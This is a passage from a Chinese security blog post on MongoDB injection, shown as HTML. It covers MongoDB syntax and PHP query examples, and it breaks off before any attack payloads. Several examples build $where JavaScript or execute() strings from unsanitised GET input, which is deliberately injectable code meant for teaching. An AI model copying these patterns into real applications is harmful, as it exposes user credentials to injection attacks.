@@ -1,0 +1,1582 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="mongo注入, cLreann&#39;s  Blog">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>mongo注入 | cLreann&#39;s  Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">cLreann&#39;s  Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">cLreann&#39;s  Blog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">mongo注入</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web/">
+                                <span class="chip bg-color">web</span>
+                            </a>
+                        
+                            <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
+                                <span class="chip bg-color">sql注入</span>
+                            </a>
+                        
+                            <a href="/tags/nosql/">
+                                <span class="chip bg-color">nosql</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%94%BB%E9%98%B2-web/" class="post-category">
+                                攻防-web
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-11-25
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="知识储备"><a href="#知识储备" class="headerlink" title="知识储备"></a>知识储备</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><pre class="language-none"><code class="language-none">MySQL：MongoDB</code></pre>
+
+<ul>
+<li>数据库：数据库</li>
+<li>表：集合</li>
+<li>数据：文档</li>
+</ul>
+<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>由于 MongoDB 的语法与常见的 RDBMS 数据库差距较大，所以不打算一一进行对比。</p>
+<p>归纳一下常用的语法：</p>
+<ul>
+<li><p>创建数据库：<code>use DATABASE_NAME</code>，数据库不存在，则创建数据库，否则切换到指定数据库。</p>
+</li>
+<li><p>查看所有数据库： <code>show dbs</code>、<code>db.getCollectionNames()</code></p>
+</li>
+<li><p>版本：<code>db.version()</code></p>
+</li>
+<li><p>删除数据库：<code>db.dropDatabase()</code></p>
+</li>
+<li><p>查看当前数据库：<code>db</code>、<code>db.getName()</code></p>
+</li>
+<li><p>插入：<code>db.COLLECTION_NAME.insert(document)</code></p>
+</li>
+<li><p>查询：<code>db.COLLECTION_NAME.find(query, projection)</code></p>
+</li>
+<li><p>OR：MongoDB <code>OR</code>条件语句使用了关键字<code>$or</code>。</p>
+<pre class="language-none"><code class="language-none">db.COLLECTION_NAME.find(
+   &#123;
+      $or: [
+         &#123;key1: value1&#125;, &#123;key2:value2&#125;
+      ]
+   &#125;
+).pretty()
+Copy</code></pre></li>
+<li><p>AND：MongoDB 的 <code>find()</code> 可以传入多个键(key)，每个键(key)以<code>,</code>隔开，即 SQL 的 <code>AND</code> 条件。<code>db.COLLECTION_NAME.find(&#123;key1: value1, key2: value2&#125;)</code>。当然 MongoDB 也有<code>$and</code>，所以 <code>and</code>也可以和<code>or</code>一样用。</p>
+</li>
+<li><p>limit：<code>db.COLLECTION_NAME.find().limit(NUMBER)</code></p>
+</li>
+<li><p>skip：<code>skip()</code> 方法为跳过指定数量的数据。接受一个数字参数作为跳过的记录条数。<code>db.COLLECTION_NAME.find().limit(NUMBER).skip(NUMBER)</code></p>
+</li>
+<li><p>注释：<code>//</code></p>
+</li>
+<li><p>转为 json：<code>tojson()</code></p>
+</li>
+<li><p>所有<code>db</code>的方法：</p>
+<pre class="language-none"><code class="language-none">&gt; db.
+db.adminCommand(               db.getName(                    db.printSlaveReplicationInfo(
+db.aggregate(                  db.getPrevError(               db.propertyIsEnumerable
+db.auth(                       db.getProfilingLevel(          db.prototype
+db.changeUserPassword(         db.getProfilingStatus(         db.removeUser(
+db.cloneCollection(            db.getQueryOptions(            db.repairDatabase(
+db.cloneDatabase(              db.getReplicationInfo(         db.resetError(
+db.commandHelp(                db.getRole(                    db.revokePrivilegesFromRole(
+db.constructor                 db.getRoles(                   db.revokeRolesFromRole(
+db.copyDatabase(               db.getSession(                 db.revokeRolesFromUser(
+db.createCollection(           db.getSiblingDB(               db.runCommand(
+db.createRole(                 db.getSisterDB(                db.runCommandWithMetadata(
+db.createUser(                 db.getSlaveOk(                 db.runReadCommand(
+db.createView(                 db.getUser(                    db.serverBits(
+db.currentOP(                  db.getUsers(                   db.serverBuildInfo(
+db.currentOp(                  db.getWriteConcern(            db.serverCmdLineOpts(
+db.dbEval(                     db.grantPrivilegesToRole(      db.serverStatus(
+db.dropAllRoles(               db.grantRolesToRole(           db.setLogLevel(
+db.dropAllUsers(               db.grantRolesToUser(           db.setProfilingLevel(
+db.dropDatabase(               db.group(                      db.setSlaveOk(
+db.dropRole(                   db.groupcmd(                   db.setWriteConcern(
+db.dropUser(                   db.groupeval(                  db.shutdownServer(
+db.eval(                       db.hasOwnProperty              db.stats(
+db.forceError(                 db.help(                       db.system.profile
+db.fsyncLock(                  db.hostInfo(                   db.toLocaleString
+db.fsyncUnlock(                db.isMaster(                   db.toString(
+db.getCollection(              db.killOP(                     db.tojson(
+db.getCollectionInfos(         db.killOp(                     db.unsetWriteConcern(
+db.getCollectionNames(         db.listCommands(               db.updateRole(
+db.getLastError(               db.loadServerScripts(          db.updateUser(
+db.getLastErrorCmd(            db.logout(                     db.users
+db.getLastErrorObj(            db.printCollectionStats(       db.valueOf(
+db.getLogComponents(           db.printReplicationInfo(       db.version(
+db.getMongo(                   db.printShardingStatus(</code></pre></li>
+</ul>
+<h2 id="PHP-联动"><a href="#PHP-联动" class="headerlink" title="PHP 联动"></a>PHP 联动</h2><p>其实什么语言是没有太大区别的。我就以 PHP 为例。<br>由于版本的问题，适用于 PHP <code>5.x</code>以下和 <code>7.x</code>以上的 MongoDB Driver 还有新旧之分：旧版 3 种，新版 3 种，所以 PHP 与 MongoDB 联动有 6 种写法。</p>
+<h3 id="旧版写法一"><a href="#旧版写法一" class="headerlink" title="旧版写法一"></a><strong>旧版写法一</strong></h3><blockquote>
+<p>用 <code>mongo</code> 类中相应的方法执行增查减改</p>
+</blockquote>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$mongo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mongoclient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token variable">$mongo</span><span class="token operator">-></span><span class="token property">myinfo</span><span class="token punctuation">;</span> <span class="token comment">//选择数据库</span>
+<span class="token variable">$coll</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token property">sec_test</span><span class="token punctuation">;</span> <span class="token comment">//选择集合</span>
+<span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$pwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$coll</span><span class="token operator">-></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uname'</span><span class="token operator">=></span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pwd'</span><span class="token operator">=></span><span class="token variable">$pwd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$user</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'username: '</span><span class="token operator">.</span><span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'password: '</span><span class="token operator">.</span><span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pwd'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'该用户不存在'</span><span class="token punctuation">;</span></span></code></pre>
+
+<p>传递的参数是一个数组，比较安全。这种形式叫 <code>ODM</code>，它会帮你过滤数据，所以一般不用担心原语句被破坏。顺便提一下，<code>ORM</code> 对应关系型数据库，如 MySQL；<code>ODM</code> 对应文档型数据库，如 MongoDB。它们的区别就在与对应的数据库类型不同，查询的形式都是通过一个类操作数据库而不是自己处理数据库语句，例如：<code>$coll-&gt;find();</code>。</p>
+<p>但是 MongoDB 有个<code>$where</code>操作符是可以执行 JavaScript 语句的，可扩展性一下就变强了，于是有人会这样用：</p>
+<h3 id="旧版写法二"><a href="#旧版写法二" class="headerlink" title="旧版写法二"></a><strong>旧版写法二</strong></h3><blockquote>
+<p>用 <code>$where</code> 操作符</p>
+</blockquote>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$mongo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mongoclient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token variable">$mongo</span><span class="token operator">-></span><span class="token property">myinfo</span><span class="token punctuation">;</span> <span class="token comment">//选择数据库</span>
+<span class="token variable">$coll</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token property">sec_test</span><span class="token punctuation">;</span> <span class="token comment">//选择集合</span>
+<span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$pwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$function</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"function() &#123;if(this.uname == '<span class="token interpolation"><span class="token variable">$uname</span></span>' &amp;&amp; this.pwd == '<span class="token interpolation"><span class="token variable">$pwd</span></span>') return true&#125;"</span><span class="token punctuation">;</span>
+
+<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$coll</span><span class="token operator">-></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$where'</span><span class="token operator">=></span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$user</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'username: '</span><span class="token operator">.</span><span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'password: '</span><span class="token operator">.</span><span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pwd'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'该用户不存在'</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+Copy</span></code></pre>
+
+<h3 id="旧版写法三"><a href="#旧版写法三" class="headerlink" title="旧版写法三"></a><strong>旧版写法三</strong></h3><blockquote>
+<p>用 <code>execute</code> 方法执行字符串</p>
+</blockquote>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token variable">$mongo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mongoclient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$pwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token variable">$mongo</span><span class="token operator">-></span><span class="token property">sec_test</span><span class="token punctuation">;</span> <span class="token comment">// 选择数据库</span>
+<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"db.users.find(&#123;'uname': "</span><span class="token operator">.</span><span class="token variable">$uname</span><span class="token operator">.</span><span class="token string double-quoted-string">"&#125;,&#123;'pwd', "</span><span class="token operator">.</span><span class="token variable">$pwd</span><span class="token operator">.</span><span class="token string double-quoted-string">"&#125;)"</span><span class="token punctuation">;</span>
+<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$user</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'username: '</span><span class="token operator">.</span><span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'password: '</span><span class="token operator">.</span><span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pwd'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'该用户不存在'</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span>
+Copy</code></pre>
+
+<p>传进 <code>execute</code> 的参数就是字符串。</p>
+<h3 id="新版写法一"><a href="#新版写法一" class="headerlink" title="新版写法一"></a><strong>新版写法一</strong></h3><p>利用 <code>executeQuery</code> 直接进行查询：</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$manager</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$pwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span>
+    <span class="token string single-quoted-string">'uname'</span><span class="token operator">=></span><span class="token variable">$uname</span><span class="token punctuation">,</span>
+    <span class="token string single-quoted-string">'pwd'</span><span class="token operator">=></span><span class="token variable">$pwd</span>
+<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$manager</span><span class="token operator">-></span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sec_test.users'</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$count</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$user</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$user</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token variable">$user</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'username: '</span><span class="token operator">.</span><span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'password: '</span><span class="token operator">.</span><span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pwd'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'未找到'</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span>
+Copy</code></pre>
+
+<p>与旧版写法一类似。</p>
+<p><strong>新版写法二</strong></p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$manager</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$pwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token variable">$function</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"function() &#123;if(this.uname == '<span class="token interpolation"><span class="token variable">$uname</span></span>' &amp;&amp; this.pwd == '<span class="token interpolation"><span class="token variable">$pwd</span></span>') return &#123;'username': this.uname, 'password': this.pwd&#125;&#125;"</span><span class="token punctuation">;</span>
+
+<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span>
+<span class="token string single-quoted-string">'$where'</span> <span class="token operator">=></span> <span class="token variable">$function</span>
+<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$manager</span><span class="token operator">-></span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sec_test.users'</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$count</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$user</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$user</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token variable">$user</span><span class="token punctuation">;</span>
